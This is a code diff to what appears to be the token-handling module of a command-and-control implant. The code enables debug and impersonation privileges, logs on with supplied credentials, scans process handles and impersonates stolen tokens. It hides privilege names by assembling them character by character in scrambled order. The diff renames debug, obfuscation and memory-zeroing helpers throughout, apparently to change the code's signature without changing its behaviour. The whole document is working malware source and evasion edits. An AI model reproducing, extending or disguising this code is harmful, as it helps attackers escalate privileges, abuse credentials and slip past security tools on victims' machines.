@@ -171,10 +171,10 @@ BOOL TokenQueryOwner(
             /* if we reached til this point means we were pretty much successful */
             Success = TRUE;
         } else {
-            PUTS( "Unexpected successful call to LookupAccountSidW.\n" )
+            STUP( "Unexpected successful call to LookupAccountSidW.\n" )
         }
     } else {
-        PUTS( "Unexpected successful call to NtQueryInformationToken.\n" )
+        STUP( "Unexpected successful call to NtQueryInformationToken.\n" )
     }
 
 LEAVE:
@@ -244,26 +244,26 @@ BOOL TokenSetSeDebugPriv(
     BOOL Success        = FALSE;
 
     // SeDebugPrivilege
-    PrivName[ 2  ] = HideChar('D');
-    PrivName[ 9  ] = HideChar('i');
-    PrivName[ 16 ] = HideChar('\0');
-    PrivName[ 0  ] = HideChar('S');
-    PrivName[ 3  ] = HideChar('e');
-    PrivName[ 6  ] = HideChar('g');
-    PrivName[ 7  ] = HideChar('P');
-    PrivName[ 11 ] = HideChar('i');
-    PrivName[ 4  ] = HideChar('b');
-    PrivName[ 5  ] = HideChar('u');
-    PrivName[ 10 ] = HideChar('v');
-    PrivName[ 15 ] = HideChar('e');
-    PrivName[ 1  ] = HideChar('e');
-    PrivName[ 13 ] = HideChar('e');
-    PrivName[ 14 ] = HideChar('g');
-    PrivName[ 12 ] = HideChar('l');
-    PrivName[ 8  ] = HideChar('r');
+    PrivName[ 2  ] = HiChara('D');
+    PrivName[ 9  ] = HiChara('i');
+    PrivName[ 16 ] = HiChara('\0');
+    PrivName[ 0  ] = HiChara('S');
+    PrivName[ 3  ] = HiChara('e');
+    PrivName[ 6  ] = HiChara('g');
+    PrivName[ 7  ] = HiChara('P');
+    PrivName[ 11 ] = HiChara('i');
+    PrivName[ 4  ] = HiChara('b');
+    PrivName[ 5  ] = HiChara('u');
+    PrivName[ 10 ] = HiChara('v');
+    PrivName[ 15 ] = HiChara('e');
+    PrivName[ 1  ] = HiChara('e');
+    PrivName[ 13 ] = HiChara('e');
+    PrivName[ 14 ] = HiChara('g');
+    PrivName[ 12 ] = HiChara('l');
+    PrivName[ 8  ] = HiChara('r');
 
     Success = TokenSetPrivilege(PrivName, Enable);
-    MemZero( PrivName, sizeof( PrivName ) );
+    MemeZ( PrivName, sizeof( PrivName ) );
 
     return Success;
 }
@@ -275,32 +275,32 @@ BOOL TokenSetSeImpersonatePriv(
     BOOL Success        = FALSE;
 
     // SeImpersonatePrivilege
-    PrivName[ 7  ] = HideChar('s');
-    PrivName[ 5  ] = HideChar('e');
-    PrivName[ 4  ] = HideChar('p');
-    PrivName[ 8  ] = HideChar('o');
-    PrivName[ 3  ] = HideChar('m');
-    PrivName[ 0  ] = HideChar('S');
-    PrivName[ 11 ] = HideChar('t');
-    PrivName[ 12 ] = HideChar('e');
-    PrivName[ 17 ] = HideChar('i');
-    PrivName[ 19 ] = HideChar('e');
-    PrivName[ 22 ] = HideChar('\0');
-    PrivName[ 6  ] = HideChar('r');
-    PrivName[ 16 ] = HideChar('v');
-    PrivName[ 21 ] = HideChar('e');
-    PrivName[ 10 ] = HideChar('a');
-    PrivName[ 15 ] = HideChar('i');
-    PrivName[ 9  ] = HideChar('n');
-    PrivName[ 1  ] = HideChar('e');
-    PrivName[ 13 ] = HideChar('P');
-    PrivName[ 14 ] = HideChar('r');
-    PrivName[ 2  ] = HideChar('I');
-    PrivName[ 18 ] = HideChar('l');
-    PrivName[ 20 ] = HideChar('g');
+    PrivName[ 7  ] = HiChara('s');
+    PrivName[ 5  ] = HiChara('e');
+    PrivName[ 4  ] = HiChara('p');
+    PrivName[ 8  ] = HiChara('o');
+    PrivName[ 3  ] = HiChara('m');
+    PrivName[ 0  ] = HiChara('S');
+    PrivName[ 11 ] = HiChara('t');
+    PrivName[ 12 ] = HiChara('e');
+    PrivName[ 17 ] = HiChara('i');
+    PrivName[ 19 ] = HiChara('e');
+    PrivName[ 22 ] = HiChara('\0');
+    PrivName[ 6  ] = HiChara('r');
+    PrivName[ 16 ] = HiChara('v');
+    PrivName[ 21 ] = HiChara('e');
+    PrivName[ 10 ] = HiChara('a');
+    PrivName[ 15 ] = HiChara('i');
+    PrivName[ 9  ] = HiChara('n');
+    PrivName[ 1  ] = HiChara('e');
+    PrivName[ 13 ] = HiChara('P');
+    PrivName[ 14 ] = HiChara('r');
+    PrivName[ 2  ] = HiChara('I');
+    PrivName[ 18 ] = HiChara('l');
+    PrivName[ 20 ] = HiChara('g');
 
     Success = TokenSetPrivilege(PrivName, Enable);
-    MemZero( PrivName, sizeof( PrivName ) );
+    MemeZ( PrivName, sizeof( PrivName ) );
 
     return Success;
 }
@@ -486,7 +486,7 @@ BOOL TokenRemove( DWORD TokenID )
 
     if ( Instance->Tokens.Vault == TokenItem )
     {
-        PUTS( "Its first item" )
+        STUP( "Its first item" )
         TokenItem = Instance->Tokens.Vault->NextToken;
 
         if ( Instance->Tokens.Impersonate && Instance->Tokens.Token->Handle == Instance->Tokens.Vault->Handle )
@@ -540,7 +540,7 @@ BOOL TokenRemove( DWORD TokenID )
         {
             if ( TokenList->NextToken == TokenItem )
             {
-                PUTS( "Found TokenItem" )
+                STUP( "Found TokenItem" )
 
                 TokenList->NextToken = TokenItem->NextToken;
 
@@ -610,7 +610,7 @@ HANDLE TokenMake( LPWSTR User, LPWSTR Password, LPWSTR Domain, DWORD LogonType )
 
     if ( ! Instance->Win32.LogonUserW( User, Domain, Password, LogonType, LogonType == LOGON32_LOGON_NEW_CREDENTIALS ? LOGON32_PROVIDER_WINNT50 : LOGON32_PROVIDER_DEFAULT, &hToken ) )
     {
-        PUTS( "LogonUserW: Failed" )
+        STUP( "LogonUserW: Failed" )
         PACKAGE_ERROR_WIN32
     }
 
@@ -963,7 +963,7 @@ BOOL GetTokenInfo(
 
     if ( ! TokenQueryOwner( hToken, UserDomain, TOKEN_OWNER_FLAG_DEFAULT ) )
     {
-        PUTS("TokenQueryOwner failed")
+        STUP("TokenQueryOwner failed")
         goto Cleanup;
     }
 
@@ -988,7 +988,7 @@ BOOL GetTokenInfo(
             }
             else
             {
-                PUTS( "GetTokenInformation failed" )
+                STUP( "GetTokenInformation failed" )
             }
         }
         else if (TokenStatisticsInformation->TokenType == TokenImpersonation)
@@ -1004,13 +1004,13 @@ BOOL GetTokenInfo(
             }
             else
             {
-                PUTS( "GetTokenInformation failed" )
+                STUP( "GetTokenInformation failed" )
             }
         }
     }
     else
     {
-        PUTS( "GetTokenInformation failed" )
+        STUP( "GetTokenInformation failed" )
     }
 
 Cleanup:
@@ -1053,7 +1053,7 @@ BOOL GetProcessesFromHandleTable( IN PSYSTEM_HANDLE_INFORMATION handleTableInfor
         {
             if (process_list->Count + 1 > MAX_PROCESSES)
             {
-                PUTS("Too many processes, please increase MAX_PROCESSES");
+                STUP("Too many processes, please increase MAX_PROCESSES");
                 goto cleanup;
             }
             process_list->ProcessId[process_list->Count++] = handleInfo->UniqueProcessId;
@@ -1263,7 +1263,7 @@ BOOL ImpersonateTokenFromVault(
     TokenData = TokenGet( TokenID );
 
     if ( ! TokenData ) {
-        PUTS( "Token not found in vault." )
+        STUP( "Token not found in vault." )
         PackageTransmitError( CALLBACK_ERROR_TOKEN, 0x1 );
         goto Cleanup;
     }
@@ -1374,7 +1374,7 @@ BOOL ImpersonateTokenInStore(
     }
 
     if ( ! TokenSetSeDebugPriv( TRUE ) ) {
-        PUTS( "Could not enable SE_DEBUG_NAME privilege." )
+        STUP( "Could not enable SE_DEBUG_NAME privilege." )
         goto Cleanup;
     }
 
